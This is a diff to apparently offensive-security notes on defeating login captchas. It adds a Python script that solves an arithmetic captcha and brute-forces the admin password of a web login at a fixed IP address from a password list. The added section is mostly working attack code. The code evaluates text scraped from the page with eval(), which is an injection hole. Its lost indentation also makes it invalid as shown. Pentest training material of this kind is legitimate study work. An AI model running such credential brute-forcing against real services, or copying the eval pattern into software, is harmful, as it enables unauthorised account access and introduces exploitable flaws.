@@ -23,7 +23,7 @@
 - Pyton script:
   - fetch the captcha datauri and the cookie from the webpage
   - use the tesseract python module to retrieve the text from the captcha
-  - terate over the password list and send a POST request to the login endpoint along with the required POST parameters
+  - iterate over the password list and send a POST request to the login endpoint along with the required POST parameters
 ```Python
 from PIL import Image
 import base64
@@ -51,3 +51,28 @@ print("Password Found: "+password)
 break
 time.sleep(0.250)
 ```
+
+## Math Captcha Bypass
+- Extract sum of image captcha equation, and brute force the login page
+- The captcha is generated between the tag: ```<h5 style="text-align: center;margin-top: 4px"> and </h5>```
+- The incorrect attempts can be identified by the "Error!" string
+```Python
+import re
+import requests
+session = requests.Session()
+regex = '<h5 style="text-align: center;margin-top: 4px">(.*?) = </h5>'
+with open('passwords.txt','r') as f:
+for password in f:
+password = password.rstrip()
+response = session.get('http://192.133.218.3')
+output = re.search(regex, response.text)
+cookies=session.cookies.get_dict()
+captcha=eval(output.group(1))
+print("Trying Password: "+password)
+data={"username":"admin","password":password,"captcha":captcha}
+output=session.post('http://192.133.218.3/login', cookies=cookies,data=data)
+if("Error" not in output.text):
+print("Password Found: "+password)
+break
+```
+
